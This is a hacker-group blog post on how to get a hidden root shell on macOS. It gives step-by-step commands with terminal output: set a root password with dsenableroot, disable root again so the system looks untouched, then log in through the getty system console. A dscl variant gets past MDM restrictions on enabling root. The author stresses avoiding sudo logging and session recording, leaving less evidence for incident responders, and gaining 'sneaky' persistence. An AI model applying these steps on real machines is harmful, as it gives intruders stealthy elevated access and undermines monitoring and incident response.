<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="macOS Serial Console Login" /><meta name="author" content="n0ncetonic" /><meta property="og:locale" content="en" /><meta name="description" content="Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. For some added fun‚Äîand in keeping with Eric Raymond‚Äôs Rule of Diversity‚Äìone of the procedures neuters a common mitigation against re-enabling the root user." /><meta property="og:description" content="Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. For some added fun‚Äîand in keeping with Eric Raymond‚Äôs Rule of Diversity‚Äìone of the procedures neuters a common mitigation against re-enabling the root user." /><link rel="canonical" href="https://blacksunhackers.club/posts/macOS-serial-console-login/" /><meta property="og:url" content="https://blacksunhackers.club/posts/macOS-serial-console-login/" /><meta property="og:site_name" content="Blacksun Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-11-18T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="macOS Serial Console Login" /><meta name="twitter:site" content="@BlacksunLabs_" /><meta name="twitter:creator" content="@n0ncetonic" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"n0ncetonic"},"description":"Foreword This short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. For some added fun‚Äîand in keeping with Eric Raymond‚Äôs Rule of Diversity‚Äìone of the procedures neuters a common mitigation against re-enabling the root user.","url":"https://blacksunhackers.club/posts/macOS-serial-console-login/","@type":"BlogPosting","headline":"macOS Serial Console Login","dateModified":"2021-09-12T03:23:26+08:00","datePublished":"2018-11-18T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://blacksunhackers.club/posts/macOS-serial-console-login/"},"@context":"https://schema.org"}</script><title>macOS Serial Console Login | Blacksun Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Blacksun Hackers Club"><meta name="application-name" content="Blacksun Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/images/bsh_logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Blacksun Hackers Club</a></div><div class="site-subtitle font-italic">Just a bunch of hackers doing what we find fun.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/BlacksunLabs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/BlacksunLabs_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>macOS Serial Console Login</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>macOS Serial Console Login</h1><div class="post-meta text-muted d-flex flex-column"><div> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 18, 2018, 12:00 AM +0800" >Nov 18, 2018<i class="unloaded">2018-11-18T00:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 12:23 PM -0700" >Sep 11, 2021<i class="unloaded">2021-09-12T03:23:26+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1215 words">6 min read</span></div></div><div class="post-content"><h2 id="foreword">Foreword</h2><p>This short post documents a technique for authenticating as <code class="language-plaintext highlighter-rouge">root</code> on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the <code class="language-plaintext highlighter-rouge">root</code> user. For some added fun‚Äîand in keeping with Eric Raymond‚Äôs <em>Rule of Diversity</em>‚Äìone of the procedures neuters a common mitigation against re-enabling the <code class="language-plaintext highlighter-rouge">root</code> user.</p><blockquote><p>Rule of Diversity Developers should design their programs to be flexible and open. This rule aims to make programs flexible, <strong>allowing them to be used in ways other than those their developers intended</strong>. ;)</p></blockquote><h2 id="the-route-to-root">The route to root</h2><p>Under a default installation of macOS any administratrative user can trivially enable (and disable) the <code class="language-plaintext highlighter-rouge">root</code> account via the <a href="https://ss64.com/osx/dsenableroot.html"><code class="language-plaintext highlighter-rouge">dsenableroot(8)</code></a> command.</p><blockquote><p>DESCRIPTION dsenableroot sets the password for the root account if enabling the root user account. Otherwise, if disable [-d] is chosen, the root account passwords are removed and the root user is disabled.</p></blockquote><p>When enabling the root user via <code class="language-plaintext highlighter-rouge">dsenableroot</code> you will be prompted for a ‚Äúroot password‚Äù but knowing the root password is not a requirement (and by default <code class="language-plaintext highlighter-rouge">root</code> does not have a password); anything you enter here will be accepted as the password for <code class="language-plaintext highlighter-rouge">root</code> so long as you don‚Äôt fat-finger it when prompted to ‚Äúverify root password‚Äù.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Successfully enabled root user.
</pre></table></code></div></div><p><strong>Secret Squirrel Note</strong> It‚Äôs worth noting here that this was all done without running the <code class="language-plaintext highlighter-rouge">sudo</code> command which might otherwise raise a red flag on networks where users do not commonly run <code class="language-plaintext highlighter-rouge">sudo</code> or in cases where solutions such as Centrify have been deployed to trigger session recording when <code class="language-plaintext highlighter-rouge">dzdo</code>/<code class="language-plaintext highlighter-rouge">sudo</code> are run. One less data point for incident responders during post-mortem examination of a host.</p><p>Likewise it is similarly easy to disable the root user, allowing administrators to disable the root user after concluding its use.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>user@blacksunlabs:~ $ dsenableroot -d
username = user
user password:

dsenableroot:: ***Successfully disabled root user.
</pre></table></code></div></div><h3 id="mdm-a-protection">MDM: A protection</h3><p>It is becoming more and more common to restrict enabling <code class="language-plaintext highlighter-rouge">root</code> for end-users on managed workstations. As most end-users have no need for explicitly logging in as <code class="language-plaintext highlighter-rouge">root</code>, this is considered good security hygiene.</p><p>In these situations, attempting to enable <code class="language-plaintext highlighter-rouge">root</code> via <code class="language-plaintext highlighter-rouge">dsenableroot</code> will produce an error such as this:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Failed to enable root user.
</pre></table></code></div></div><p>We will address the case of hardened workstations near the conclusion of this post.</p><h2 id="the-not-so-secret-life-of-getty">The not so secret life of <code class="language-plaintext highlighter-rouge">getty</code></h2><p><strong>History Lesson</strong> If you‚Äôve had the pleasure of contracting tinnitus as a result of prolonged employment in a NOC, you are probably all too familiar with <a href="https://www.freebsd.org/cgi/man.cgi?query=getty&amp;sektion=8&amp;manpath=freebsd-release-ports"><code class="language-plaintext highlighter-rouge">getty(8)</code></a>. You‚Äôve probably also made Null Modem cables out of speaker wire in a pinch.</p><p>For those with limited familiarity with <code class="language-plaintext highlighter-rouge">getty</code>, don‚Äôt worry. In a nutshell, <code class="language-plaintext highlighter-rouge">getty</code> is in charge of initializing a tty terminal, prompting for user credentials, and passing those credentials over to <a href="https://www.freebsd.org/cgi/man.cgi?query=login&amp;sektion=1&amp;apropos=0&amp;manpath=FreeBSD+11.2-RELEASE+and+Ports"><code class="language-plaintext highlighter-rouge">login(1)</code></a> to handle the heavy lifting. More specifically, it allows system consoles, psuedo-terminals, or terminals to login to a local system over a non-graphical interface.</p><h3 id="a-link-to-the-past">A link to the past</h3><p>In <em>much</em> older versions of macOS‚Äîthink Mac OS X Jaguar and similar‚Äîit was possible to get access to the system console login by <a href="https://hints.macworld.com/article.php?story=20020318020806482">entering ‚Äú&gt;console‚Äù as a username</a> on the graphical login screen. This functionality has long-since been removed but it got me wondering about the system console on modern macOS incarnations.</p><h2 id="pocgtfo">PoC||GTFO</h2><p>Now that the useful content of this post has been padded with enough background info to not fit in a tweet or two, let‚Äôs get to the good bits.</p><p>The procedure on default or non-hardened workstations is quite simple:</p><ul><li><code class="language-plaintext highlighter-rouge">dsenableroot</code> to set a root password<li><code class="language-plaintext highlighter-rouge">dsenableroot -d</code> to disable the root account. It really shouldn‚Äôt be enabled and upon cursory glance the environment mimicks a default system<li><code class="language-plaintext highlighter-rouge">/usr/libexec/getty console</code> to drop us into a system console login prompt.</ul><p>Once at a system console login prompt simply enter ‚Äúroot‚Äù as your login and when prompted, provide the password you set using <code class="language-plaintext highlighter-rouge">dsenableroot</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Successfully enabled root user.
user@blacksunlabs:~ $ dsenableroot -d
username = user
user password:

dsenableroot:: ***Successfully disabled root user.
user@blacksunlabs:~ $ /usr/libexec/getty console
ÔøΩ
DÔøΩrwiÔøΩBSDÔøΩ(blackÔøΩsunÔøΩ-labsÔøΩÔøΩÔøΩ(ttÔøΩÔøΩ005ÔøΩÔøΩ
ÔøΩ
loÔøΩiÔøΩ:ÔøΩrootÔøΩ
            Password:
Last login: Sat Nov 17 12:53:32 on ttys004
blacksunlabs:~ root# id -a
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
blacksunlabs:~ root# exit
logout
</pre></table></code></div></div><p>There you go. Despite <code class="language-plaintext highlighter-rouge">root</code> being disabled by Directory Services, logging in via a serial connection such as the system console happily ignores Directory Services and presents us with a fully functional tty and shell. An added bonus is that we did not have to invoke <code class="language-plaintext highlighter-rouge">sudo</code>‚Äîor even be in the sudoers file üòâ‚Äîand there is no cascading process tree connecting our root shell to the original user.</p><h3 id="remember-churchill">Remember Churchill</h3><blockquote><p>Don‚Äôt take ‚Äòno‚Äô for an answer, never submit to failure. - Winston Churchill</p></blockquote><p>If you encountered that pesky ‚Äú<code class="language-plaintext highlighter-rouge">dsenableroot:: ***Failed to enable root user.</code>‚Äù message when running <code class="language-plaintext highlighter-rouge">dsenableroot</code> remember the <em>Rule of Diversity</em> and add some Churchill for good measure. If the system says ‚Äúno‚Äù, use tools in a way developers hadn‚Äôt intended and elbow security mitigations in the face for doubting your skills.</p><p>As was shown in the previous procedure, the only thing that‚Äôs actually needed is a known password for the root user. While <code class="language-plaintext highlighter-rouge">dsenableroot</code> allows us to circumvent sudoers restrictions and cover our tracks a bit, it does still require knowing the password of a user with administrative permissions.</p><p>Taking advantage of the fact that most macOS workstations follow the ‚Äúsingle user administrator‚Äù model we have a few potential ways for leveraging our administrator user‚Äôs credentials to set a password for the root user.</p><p><a href="https://ss64.com/osx/dscl.html"><code class="language-plaintext highlighter-rouge">dscl(1)</code></a> is used here to mimick administrative best practices for managing macOS user credentials via Directory Services, but <code class="language-plaintext highlighter-rouge">sudo passwd root</code> would work just as well.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Failed to enable root user.
user@blacksunlabs:~ $ sudo /usr/bin/dscl . -passwd /Users/root
Password:
New Password:
01:57:11 user@blacksunlabs:~ $ /usr/libexec/getty console
ÔøΩ
DÔøΩrwiÔøΩBSDÔøΩ(blackÔøΩsunÔøΩ-labsÔøΩÔøΩÔøΩ(ttÔøΩÔøΩ005ÔøΩÔøΩ
ÔøΩ
loÔøΩiÔøΩ:ÔøΩrootÔøΩ
            Password:
trogers-ltm:~ root# id -a
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
trogers-ltm:~ root# logout
</pre></table></code></div></div><p>From ‚ÄúGo To Hell!‚Äù to ‚ÄúYo! Root Shell!‚Äù No sadfeels bourbon today, you just earned celebratory bourbon! <em>**</em></p><h2 id="closing">Closing</h2><p>Honestly I‚Äôm just glad I finally got around to writing this up. I had a need for a sneaky means of elevated persistence on a system and this idea occurred to me but as is common due to the mercurial nature of my work, the idea got shelved and priorities shifted constantly, and I never found myself in a situation formally investigate and document this technique.</p><p>Also, before i see the tweets, yes, it is possible to provide the <code class="language-plaintext highlighter-rouge">-u</code> admin username, <code class="language-plaintext highlighter-rouge">-p</code> admin password, and <code class="language-plaintext highlighter-rouge">-r</code> rootpassword as flags to <code class="language-plaintext highlighter-rouge">dsenableroot</code>, I personally prefer to be prompted interactively for these bits of information to avoid accidentally writing sensitive information to history files.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/macos/" class="post-tag no-text-decoration" >MacOS</a> <a href="/tags/post-exploitation/" class="post-tag no-text-decoration" >Post-Exploitation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=macOS Serial Console Login - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/macOS-serial-console-login/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=macOS Serial Console Login - Blacksun Hackers Club&u=https://blacksunhackers.club/posts/macOS-serial-console-login/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=macOS Serial Console Login - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/macOS-serial-console-login/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypassing-TCC-With-iTerm2/">Bypassing TCC With iTerm2</a><li><a href="/posts/acquiring-and-abusing-legacy-slack-tokens/">Acquiring and Abusing Slack Legacy Tokens on macOS</a><li><a href="/posts/macOS-serial-console-login/">macOS Serial Console Login</a><li><a href="/posts/cultivating-an-online-persona-1/">Cultivating An Online Persona Part 1 - Bypassing Gmail's Phone Verification</a><li><a href="/posts/post-exploitation-persistence-with-application-shims-intro/">Post Exploitation Persistence With Application Shims (Intro)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post-Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/chrome-arbitrary-javascript-injection-via-applescript/"><div class="card-body"> <span class="timeago small" >Dec 13, 2017<i class="unloaded">2017-12-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Chrome Arbitrary Javascript Injection Via AppleScript</h3><div class="text-muted small"><p> Foreword I‚Äôve had a PoC for this technique for a little while as part of research for a future talk on the subject of post-exploitation in MacOS, but as an article has surfaced detailing the adware...</p></div></div></a></div><div class="card"> <a href="/posts/iCloud-Authentication-Token-acquisition-on-macOS/"><div class="card-body"> <span class="timeago small" >Mar 13, 2019<i class="unloaded">2019-03-13T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>iCloud Authentication Token acquisition on macOS</h3><div class="text-muted small"><p> Foreward While this is by no means new or groundbreaking information I‚Äôve been meaning to document a process known to the forensic and law enforcement community and provided as part of point-and-cl...</p></div></div></a></div><div class="card"> <a href="/posts/acquiring-and-abusing-legacy-slack-tokens/"><div class="card-body"> <span class="timeago small" >Mar 18, 2019<i class="unloaded">2019-03-18T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Acquiring and Abusing Slack Legacy Tokens on macOS</h3><div class="text-muted small"><p> Foreward Right on the tails of my last post that detailed a token theft attack on macOS, today I‚Äôm sharing yet another procedure for acquiring and abusing tokens found on a macOS system. Included...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/chrome-arbitrary-javascript-injection-via-applescript/" class="btn btn-outline-primary" prompt="Older"><p>Chrome Arbitrary Javascript Injection Via AppleScript</p></a> <a href="/posts/scriptless-identification-of-browsers/" class="btn btn-outline-primary" prompt="Newer"><p>Scriptless Identification of Browsers</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/BlacksunLabs_">Blacksun Labs</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/macos/">MacOS</a> <a class="post-tag" href="/tags/post-exploitation/">Post Exploitation</a> <a class="post-tag" href="/tags/persistence/">Persistence</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/fingerprinting/">Fingerprinting</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/osint/">OSINT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blacksunhackers.club{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
